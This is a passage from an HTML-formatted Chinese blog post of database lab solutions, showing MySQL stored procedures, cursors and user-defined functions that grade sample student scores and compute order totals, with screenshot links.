class="number">4</span>),</span><br><span class="line"> <span class="keyword">PRIMARY</span> KEY (Sno,Cno),</span><br><span class="line"> <span class="keyword">FOREIGN</span> KEY (Sno) <span class="keyword">REFERENCES</span> Student(Sno),</span><br><span class="line"> <span class="keyword">FOREIGN</span> KEY (Cno) <span class="keyword">REFERENCES</span> Course(Cno)</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Student</span><br><span class="line"><span class="keyword">values</span>  (<span class="string">&#x27;201215121&#x27;</span>,<span class="string">&#x27;李勇&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;CS&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;201215122&#x27;</span>,<span class="string">&#x27;刘晨&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;CS&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;201215123&#x27;</span>,<span class="string">&#x27;王敏&#x27;</span>,<span class="string">&#x27;女&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;MA&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;201215125&#x27;</span>,<span class="string">&#x27;张立&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="number">19</span>,<span class="string">&#x27;IS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Course</span><br><span class="line"><span class="keyword">values</span>  (<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;离散数学&#x27;</span>,<span class="keyword">null</span>,<span class="number">2</span>),</span><br><span class="line">        (<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;数学&#x27;</span>,<span class="keyword">null</span>,<span class="number">2</span>),</span><br><span class="line">        (<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;操作系统&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">3</span>),</span><br><span class="line">        (<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;PASCAL语言&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">4</span>),</span><br><span class="line">        (<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;数据结构&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="number">4</span>),</span><br><span class="line">        (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;数据库&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="number">4</span>),</span><br><span class="line">        (<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;信息系统&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SC</span><br><span class="line"><span class="keyword">values</span>  (<span class="string">&#x27;201215121&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">92</span>,<span class="keyword">null</span>),</span><br><span class="line">        (<span class="string">&#x27;201215121&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">88</span>,<span class="keyword">null</span>),</span><br><span class="line">        (<span class="string">&#x27;201215122&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">90</span>,<span class="keyword">null</span>),</span><br><span class="line">        (<span class="string">&#x27;201215122&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="number">90</span>,<span class="keyword">null</span>),</span><br><span class="line">        (<span class="string">&#x27;201215125&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="number">75</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (1)</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> discrete_math_grade(<span class="keyword">OUT</span> p_100 <span class="type">SMALLINT</span>,</span><br><span class="line">                                     <span class="keyword">OUT</span> p_90 <span class="type">SMALLINT</span>,</span><br><span class="line">                                     <span class="keyword">OUT</span> p_80 <span class="type">SMALLINT</span>,</span><br><span class="line">                                     <span class="keyword">OUT</span> p_70 <span class="type">SMALLINT</span>,</span><br><span class="line">                                     <span class="keyword">OUT</span> p_60 <span class="type">SMALLINT</span>,</span><br><span class="line">                                     <span class="keyword">OUT</span> p_others <span class="type">SMALLINT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> DONE <span class="type">BOOLEAN</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>; #定义结束标识</span><br><span class="line"><span class="keyword">DECLARE</span> p_grade <span class="type">SMALLINT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> dist <span class="keyword">CURSOR</span> <span class="keyword">FOR</span></span><br><span class="line"><span class="keyword">SELECT</span> grade <span class="keyword">FROM</span> SC <span class="keyword">WHERE</span> Cno<span class="operator">=</span></span><br><span class="line">(<span class="keyword">SELECT</span> Cno <span class="keyword">FROM</span> Course <span class="keyword">WHERE</span> Cname<span class="operator">=</span><span class="string">&#x27;离散数学&#x27;</span>);</span><br><span class="line"><span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> <span class="keyword">SQLSTATE</span> <span class="string">&#x27;02000&#x27;</span> <span class="keyword">SET</span> DONE <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">SET</span> p_100 <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span> p_90 <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span> p_80 <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span> p_70 <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span> p_60 <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span> p_others <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">OPEN</span> dist;</span><br><span class="line">LOOP1: LOOP</span><br><span class="line"><span class="keyword">FETCH</span> dist <span class="keyword">INTO</span> p_grade;</span><br><span class="line">IF DONE <span class="operator">=</span> <span class="number">1</span> <span class="keyword">THEN</span></span><br><span class="line">LEAVE LOOP1;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line">IF p_grade <span class="operator">=</span> <span class="number">100</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_100 <span class="operator">=</span> p_100 <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">ELSEIF p_grade <span class="operator">&gt;=</span> <span class="number">90</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_90 <span class="operator">=</span> p_90 <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">ELSEIF p_grade <span class="operator">&gt;=</span> <span class="number">80</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_80 <span class="operator">=</span> p_80 <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">ELSEIF p_grade <span class="operator">&gt;=</span> <span class="number">70</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_70 <span class="operator">=</span> p_70 <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">ELSEIF p_grade <span class="operator">&gt;=</span> <span class="number">60</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_60 <span class="operator">=</span> p_60 <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">ELSE</span></span><br><span class="line"><span class="keyword">SET</span> p_others <span class="operator">=</span> p_others <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">END</span> LOOP;</span><br><span class="line"><span class="keyword">CLOSE</span> dist;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> discrete_math_grade(<span class="variable">@p</span>_100,<span class="variable">@p</span>_90,<span class="variable">@p</span>_80,<span class="variable">@p</span>_70,<span class="variable">@p</span>_60,<span class="variable">@p</span>_others);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@p</span>_100,<span class="variable">@p</span>_90,<span class="variable">@p</span>_80,<span class="variable">@p</span>_70,<span class="variable">@p</span>_60,<span class="variable">@p</span>_others;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> avegrade(<span class="keyword">IN</span> crouse_name <span class="type">CHAR</span>(<span class="number">40</span>),<span class="keyword">OUT</span> avg_grade <span class="type">SMALLINT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> p_grade <span class="type">SMALLINT</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(Grade) <span class="keyword">INTO</span> avg_grade</span><br><span class="line"><span class="keyword">FROM</span> SC <span class="keyword">WHERE</span> Cno<span class="operator">=</span></span><br><span class="line">(<span class="keyword">SELECT</span> Cno <span class="keyword">FROM</span> Course <span class="keyword">WHERE</span> Cname<span class="operator">=</span>crouse_name);</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"><span class="keyword">CALL</span> avegrade(<span class="string">&#x27;离散数学&#x27;</span>,<span class="variable">@avg</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@avg</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> SC;</span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> gradetype()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> DONE <span class="type">BOOLEAN</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;#定义结束标识</span><br><span class="line"><span class="keyword">DECLARE</span> p_sno <span class="type">CHAR</span>(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">DECLARE</span> p_cno <span class="type">CHAR</span>(<span class="number">4</span>);</span><br><span class="line"> <span class="keyword">DECLARE</span> p_grade <span class="type">SMALLINT</span>;</span><br><span class="line"><span class="keyword">DECLARE</span> p_level <span class="type">CHAR</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">DECLARE</span> gradecursor <span class="keyword">CURSOR</span> <span class="keyword">FOR</span></span><br><span class="line"><span class="keyword">SELECT</span> sno,cno,grade <span class="keyword">FROM</span> SC;</span><br><span class="line"><span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> <span class="keyword">SQLSTATE</span> <span class="string">&#x27;02000&#x27;</span> <span class="keyword">SET</span> DONE <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">OPEN</span> gradecursor;</span><br><span class="line">LOOP1: LOOP</span><br><span class="line"><span class="keyword">FETCH</span> gradecursor <span class="keyword">INTO</span> p_sno,p_cno,p_grade;</span><br><span class="line">IF DONE <span class="operator">=</span> <span class="number">1</span> <span class="keyword">THEN</span></span><br><span class="line">LEAVE LOOP1;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line">IF p_grade <span class="operator">&gt;=</span> <span class="number">90</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_level <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">ELSEIF p_grade <span class="operator">&gt;=</span> <span class="number">80</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_level <span class="operator">=</span> <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">ELSEIF p_grade <span class="operator">&gt;=</span> <span class="number">70</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_level <span class="operator">=</span> <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">ELSEIF p_grade <span class="operator">&gt;=</span> <span class="number">60</span> <span class="keyword">THEN</span></span><br><span class="line"><span class="keyword">SET</span> p_level <span class="operator">=</span> <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line"><span class="keyword">ELSE</span></span><br><span class="line"><span class="keyword">SET</span> p_level <span class="operator">=</span> <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">UPDATE</span> SC <span class="keyword">SET</span> Level <span class="operator">=</span> p_level</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span>p_cno <span class="keyword">AND</span> Sno<span class="operator">=</span>p_Sno; </span><br><span class="line"><span class="keyword">END</span> LOOP;</span><br><span class="line"><span class="keyword">CLOSE</span> gradecursor;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> gradetype;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> SC;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw9%2610/8-2-1.png" alt="8-2-1"></p><p><img src="https://img.lfalive.top/db-hw9%2610/8-2-2.png" alt="8-2-2"></p><p><img src="https://img.lfalive.top/db-hw9%2610/8-2-3.png" alt="8-2-3"></p><p><img src="https://img.lfalive.top/db-hw9%2610/8-2-4.png" alt="8-2-4"></p><h2 id="实验6存储过程实验"><a href="#实验6存储过程实验" class="headerlink" title="实验6存储过程实验"></a>实验6存储过程实验</h2><h3 id="实验6-1存储过程实验"><a href="#实验6-1存储过程实验" class="headerlink" title="实验6.1存储过程实验"></a>实验6.1存储过程实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 除了Orders和Lineitem，其他表格按实验一步骤导入数据。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Orders(orderkey,custkey,totalprice)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">61018</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Lineitem(orderkey,linenumber,extendedprice,discount,tax)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (1)无参数的存储过程</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> Proc_CalTotalPrice()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">UPDATE</span> orders</span><br><span class="line"><span class="keyword">SET</span> totalprice <span class="operator">=</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">SUM</span>( extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax))</span><br><span class="line">         <span class="keyword">FROM</span> lineitem </span><br><span class="line">         <span class="keyword">WHERE</span> orders.orderkey <span class="operator">=</span> lineitem.orderkey );</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> Proc_CalTotalPrice ();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Orders;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)有参数的存储过程</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> Proc_CalTotalPrice4Order(<span class="keyword">IN</span> okey <span class="type">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">UPDATE</span> orders </span><br><span class="line"><span class="keyword">SET</span> totalprice <span class="operator">=</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">SUM</span>( extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax)) </span><br><span class="line"><span class="keyword">FROM</span> lineitem </span><br><span class="line"><span class="keyword">WHERE</span> orders.orderkey <span class="operator">=</span> lineitem.orderkey </span><br><span class="line">         <span class="keyword">AND</span> lineitem.orderkey <span class="operator">=</span> okey);</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> Proc_CalTotalPrice4Order(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Orders;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)有局部变量的存储过程</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> Proc_CalTotalPrice4Customer(<span class="keyword">IN</span> p_custname <span class="type">CHAR</span>(<span class="number">25</span>))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> L_custkey <span class="type">INTEGER</span>;</span><br><span class="line">    <span class="keyword">SELECT</span> custkey <span class="keyword">INTO</span> L_custkey</span><br><span class="line">    <span class="keyword">FROM</span> Customer</span><br><span class="line">    <span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="built_in">TRIM</span>(p_custname);</span><br><span class="line">    <span class="keyword">UPDATE</span> Orders</span><br><span class="line">    <span class="keyword">SET</span> totalprice <span class="operator">=</span></span><br><span class="line">    (<span class="keyword">SELECT</span> <span class="built_in">SUM</span>( extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax))</span><br><span class="line">            <span class="keyword">FROM</span> Lineitem</span><br><span class="line">            <span class="keyword">WHERE</span> Orders.orderkey <span class="operator">=</span> Lineitem.orderkey </span><br><span class="line">             <span class="keyword">AND</span> Orders.custkey <span class="operator">=</span> L_custkey);</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> Proc_CalTotalPrice4Customer (<span class="string">&#x27;高乌恩&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Orders </span><br><span class="line"><span class="keyword">WHERE</span> custkey <span class="operator">=</span> (<span class="keyword">SELECT</span> custkey <span class="keyword">FROM</span> Customer <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;高乌恩&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)有输出参数的存储过程</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> Proc_CalTotalPrice4Customer2(<span class="keyword">IN</span> p_custname <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line">                                              <span class="keyword">OUT</span> p_totalprice <span class="type">REAL</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> L_custkey <span class="type">INTEGER</span>;</span><br><span class="line">    <span class="keyword">SELECT</span> custkey <span class="keyword">INTO</span> L_custkey</span><br><span class="line">    <span class="keyword">FROM</span> Customer</span><br><span class="line">    <span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="built_in">TRIM</span>(p_custname);</span><br><span class="line">    <span class="keyword">UPDATE</span> Orders</span><br><span class="line">    <span class="keyword">SET</span> totalprice <span class="operator">=</span></span><br><span class="line">    (<span class="keyword">SELECT</span> <span class="built_in">SUM</span>( extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax))</span><br><span class="line">            <span class="keyword">FROM</span> Lineitem</span><br><span class="line">            <span class="keyword">WHERE</span> Orders.orderkey <span class="operator">=</span> Lineitem.orderkey </span><br><span class="line">             <span class="keyword">AND</span> Orders.custkey <span class="operator">=</span> L_custkey);</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(totalprice) <span class="keyword">INTO</span> p_totalprice</span><br><span class="line">    <span class="keyword">FROM</span> Orders <span class="keyword">WHERE</span> custkey <span class="operator">=</span> L_custkey;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> Proc_CalTotalPrice4Customer2 (<span class="string">&#x27;高乌恩&#x27;</span>, <span class="variable">@totalprice</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@totalprice</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Orders </span><br><span class="line"><span class="keyword">WHERE</span> custkey <span class="operator">=</span> (<span class="keyword">SELECT</span> custkey <span class="keyword">FROM</span> Customer <span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="string">&#x27;高乌恩&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)修改存储过程</span></span><br><span class="line"><span class="comment">-- 如果要修改存储过程的名称，可以先删除原存储过程，再以不同的命名创建新的存储过程。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)删除储存过程</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> Proc_CalTotalPrice4Customer2;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw9%2610/6-1-1.png" alt="6-1-1"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-1-2.png" alt="6-1-2"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-1-3.png" alt="6-1-3"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-1-4.png" alt="6-1-4"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-1-5.png" alt="6-1-5"></p><h3 id="实验6-2自定义函数实验"><a href="#实验6-2自定义函数实验" class="headerlink" title="实验6.2自定义函数实验"></a>实验6.2自定义函数实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 除了Orders和Lineitem，其他表格按实验一步骤导入数据。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Orders(orderkey,custkey,totalprice)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">61018</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Lineitem(orderkey,linenumber,extendedprice,discount,tax)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (1)无参数的自定义函数</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> FUN_CalTotalPrice()</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">REAL</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> res <span class="type">REAL</span>;</span><br><span class="line">    <span class="keyword">UPDATE</span> Orders</span><br><span class="line">    <span class="keyword">SET</span> totalprice <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">SUM</span>(extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax))</span><br><span class="line">                      <span class="keyword">FROM</span> Lineitem </span><br><span class="line">                      <span class="keyword">WHERE</span> Orders.orderkey <span class="operator">=</span> Lineitem.orderkey);</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(totalprice) <span class="keyword">INTO</span> res</span><br><span class="line">    <span class="keyword">FROM</span> Orders;</span><br><span class="line">    <span class="keyword">RETURN</span> res;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> FUN_CalTotalPrice();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)有参数的自定义函数</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> FUN_CalTotalPrice4Order(p_okey <span class="type">INTEGER</span>)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">REAL</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> res <span class="type">REAL</span>;</span><br><span class="line">    <span class="keyword">UPDATE</span> Orders</span><br><span class="line">    <span class="keyword">SET</span> totalprice <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="built_in">SUM</span>(extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax))</span><br><span class="line">                      <span class="keyword">FROM</span> Lineitem </span><br><span class="line">                      <span class="keyword">WHERE</span> Orders.orderkey <span class="operator">=</span> Lineitem.orderkey </span><br><span class="line">                      <span class="keyword">AND</span> lineitem.orderkey <span class="operator">=</span> p_okey);</span><br><span class="line">    <span class="keyword">SELECT</span> totalprice <span class="keyword">INTO</span> res</span><br><span class="line">    <span class="keyword">FROM</span> Orders</span><br><span class="line">    <span class="keyword">WHERE</span> orderkey <span class="operator">=</span> p_okey;</span><br><span class="line">    <span class="keyword">RETURN</span> res;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> FUN_CalTotalPrice4Order(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)有局部变量的自定义函数</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> FUN_CalTotalPrice4Customer(p_custname <span class="type">CHAR</span>(<span class="number">25</span>))</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">REAL</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> L_custkey <span class="type">INTEGER</span>;</span><br><span class="line">    <span class="keyword">DECLARE</span> res <span class="type">REAL</span>;</span><br><span class="line">    <span class="keyword">SELECT</span> custkey <span class="keyword">INTO</span> L_custkey</span><br><span class="line">    <span class="keyword">FROM</span> Customer</span><br><span class="line">    <span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="built_in">TRIM</span>(p_custname);</span><br><span class="line">    <span class="keyword">UPDATE</span> Orders</span><br><span class="line">    <span class="keyword">SET</span> totalprice <span class="operator">=</span></span><br><span class="line">    (<span class="keyword">SELECT</span> <span class="built_in">SUM</span>( extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax))</span><br><span class="line">            <span class="keyword">FROM</span> Lineitem</span><br><span class="line">            <span class="keyword">WHERE</span> Orders.orderkey <span class="operator">=</span> Lineitem.orderkey</span><br><span class="line">                 <span class="keyword">AND</span> Orders.custkey <span class="operator">=</span> L_custkey);</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(totalprice) <span class="keyword">INTO</span> res</span><br><span class="line">    <span class="keyword">FROM</span> Orders</span><br><span class="line">    <span class="keyword">WHERE</span> custkey <span class="operator">=</span> L_custkey;</span><br><span class="line">    <span class="keyword">RETURN</span> res;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> FUN_CalTotalPrice4Customer(<span class="string">&#x27;高乌恩&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)有输出参数的自定义函数</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">FUNCTION</span> FUN_CalTotalPrice4Customer2;</span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> FUN_CalTotalPrice4Customer2(p_custname <span class="type">CHAR</span>(<span class="number">25</span>),</span><br><span class="line">                                            p_totalprice <span class="type">REAL</span>)</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">REAL</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">DECLARE</span> L_custkey <span class="type">INTEGER</span>;</span><br><span class="line">    <span class="keyword">DECLARE</span> res <span class="type">REAL</span>;</span><br><span class="line">    <span class="keyword">SELECT</span> custkey <span class="keyword">INTO</span> L_custkey</span><br><span class="line">    <span class="keyword">FROM</span> 